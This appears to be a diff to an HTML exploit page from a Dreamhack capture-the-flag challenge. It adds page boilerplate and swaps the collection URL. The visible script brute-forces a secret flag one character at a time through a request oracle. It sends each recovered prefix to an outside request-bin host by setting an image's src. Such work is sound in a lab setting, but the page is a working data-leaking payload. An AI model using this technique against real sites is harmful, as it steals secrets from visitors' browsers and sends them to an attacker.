@@ -1,3 +1,9 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Example</title>
+</head>
+<body>
 <iframe id="frame"></iframe>
 <img id="img">
 <script>
@@ -31,7 +37,7 @@
                 if(await sendrequest(flag+ch)) {
                     flag += ch;
                     var img = document.getElementById("img");
-                    img.src = "https://ghjczmz.request.dreamhack.games/?"+flag;
+                    img.src = "https://btnelbb.request.dreamhack.games/?"+flag;
                     break;
                 }
             }
@@ -40,3 +46,5 @@
 
     exploit()
 </script>
+</body>
+</html>
